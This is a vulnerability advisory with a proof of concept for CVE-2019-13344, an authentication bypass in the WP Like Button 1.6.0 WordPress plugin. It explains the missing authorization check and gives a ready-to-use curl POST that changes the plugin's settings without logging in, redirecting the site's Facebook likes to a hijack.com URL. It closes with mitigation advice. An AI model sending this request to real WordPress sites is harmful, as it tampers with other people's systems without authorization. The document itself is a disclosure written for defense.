Exploit Title: WP Like Button 1.6.0 - Auth Bypass
Date: 05-Jul-19
Exploit Author: Benjamin Lim
Vendor Homepage: http://www.crudlab.com
Software Link: https://wordpress.org/plugins/wp-like-button/
Version: 1.6.0
CVE : CVE-2019-13344

1. Product & Service Introduction:
WP Like button allows you to add Facebook like button on your wordpress
blog. You can also add Share button along with Like button or can add
recommend button. As of now, the plugin has been downloaded 129,089 times
and has 10,000+ active installs.

2. Technical Details & Description:
Authentication Bypass vulnerability in the WP Like Button (Free) plugin
version 1.6.0 allows unauthenticated attackers to change the settings of
the plugin. The contains() function in wp_like_button.php did not check if
the current request is made by an authorized user, thus allowing any
unauthenticated user to successfully update the settings of the plugin.

3. Proof of Concept (PoC):
For example, the curl command below allows an attacker to change the
each_page_url parameter to https://hijack.com. This allows the attacker to
hijack Facebook likes.

curl -k -i --raw -X POST -d
"page=facebook-like-button&site_url=https%%3A%%2F%%2Flocalhost%%2Fwp&display[]=1&display[]=2&display[]=4&display[]=16&mobile=1&fb_app_id=&fb_app_admin=&kd=0&fblb_default_upload_image=&code_snippet=%%3C%%3Fphp+echo+fb_like_button()%%3B+%%3F%%3E&beforeafter=before&eachpage=url&each_page_url=
https://hijack.com&language=en_US&width=65&position=center&layout=box_count&action=like&color=light&btn_size=small&faces=1&share=1&update_fblb="
"https://localhost/wp/wp-admin/admin.php?page=facebook-like-button&edit=1"
-H "Content-Type: application/x-www-form-urlencoded"

4. Mitigation
No update has been released by the vendor. Users are advised to switch to a
different plugin.
